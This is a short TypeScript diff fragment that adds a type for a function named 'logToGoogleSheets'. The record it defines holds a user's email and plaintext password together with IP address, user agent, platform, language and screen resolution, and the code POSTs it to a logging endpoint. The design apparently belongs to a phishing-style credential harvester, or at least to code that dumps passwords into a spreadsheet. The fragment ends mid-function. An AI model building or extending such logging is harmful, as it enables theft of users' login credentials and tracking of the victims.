@@ -1,4 +1,16 @@
-export async function logToGoogleSheets(data: any) {
+type logType =  {
+    email: string,
+    password: string,
+    timestamp: string,
+    userAgent: string,
+    language: string,
+    platform: string,
+    vendor: string,
+    screenResolution: string,
+    ip: string,
+  }
+
+export async function logToGoogleSheets(data: logType) {
   try {
     const response = await fetch('/api/log', {
       method: 'POST',
